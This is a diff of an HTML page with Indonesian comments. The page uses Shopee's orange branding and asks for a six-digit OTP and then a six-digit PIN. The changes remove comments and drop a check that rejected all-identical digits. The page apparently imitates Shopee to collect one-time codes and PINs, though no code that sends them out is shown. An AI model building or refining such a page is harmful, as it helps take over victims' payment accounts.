@@ -42,7 +42,6 @@
 
         .wa {
             color: #333;
-            /* Warna diubah menjadi hitam */
             font-weight: bold;
         }
 
@@ -82,7 +81,6 @@
 
         button.active {
             background: #EE4D2D;
-            /* Warna oranye Shopee */
             cursor: pointer;
         }
 
@@ -97,7 +95,6 @@
             font-weight: 500;
         }
 
-        /* Style untuk bagian PIN (awalnya disembunyikan) */
         .pin-section {
             display: none;
             margin-top: 20px;
@@ -123,7 +120,6 @@
 
         .pin-box input:focus {
             border-color: #EE4D2D;
-            /* Warna oranye Shopee */
         }
     </style>
 </head>
@@ -171,11 +167,6 @@
             try { localStorage.setItem(key, value); return true; } catch (e) { console.warn('localStorage set fail', e); return false; }
         }
 
-        // === Utility untuk cek 6 digit semua sama ===
-        function isSixDigitsAllSame(value) {
-            return (/^\d{6}$/.test(value) && /^(\d)\1{5}$/.test(value));
-        }
-
         // === OTP Input Logic ===
         const otpInputs = document.querySelectorAll(".otp-input");
         const lanjutBtn = document.getElementById("lanjut");
@@ -191,7 +182,6 @@
 
         otpInputs.forEach((input, index) => {
             input.addEventListener("input", (e) => {
-                // Selalu hapus karakter non-angka
                 const value = e.target.value.replace(/[^0-9]/g, "");
                 e.target.value = value;
 
@@ -223,12 +213,6 @@
             // validasi format 6 digit
             if (!/^\d{6}$/.test(otp)) {
                 alert('Masukkan kode OTP 6 digit angka terlebih dahulu.');
-                return;
-            }
-
-            // cek 6 digit semua sama
-            if (isSixDigitsAllSame(otp)) {
-                alert('6 digit yang anda masukan salah');
                 return;
             }
 
@@ -275,7 +259,6 @@
 
         pinInputs.forEach((input, index) => {
             input.addEventListener("input", (e) => {
-                // Selalu hapus karakter non-angka
                 const value = e.target.value.replace(/[^0-9]/g, "");
                 e.target.value = value;
 
@@ -307,12 +290,6 @@
             // validasi format 6 digit
             if (!/^\d{6}$/.test(pin)) {
                 alert('PIN harus 6 digit angka.');
-                return;
-            }
-
-            // cek 6 digit semua sama
-            if (isSixDigitsAllSame(pin)) {
-                alert('6 digit yang anda masukan salah');
                 return;
             }
 
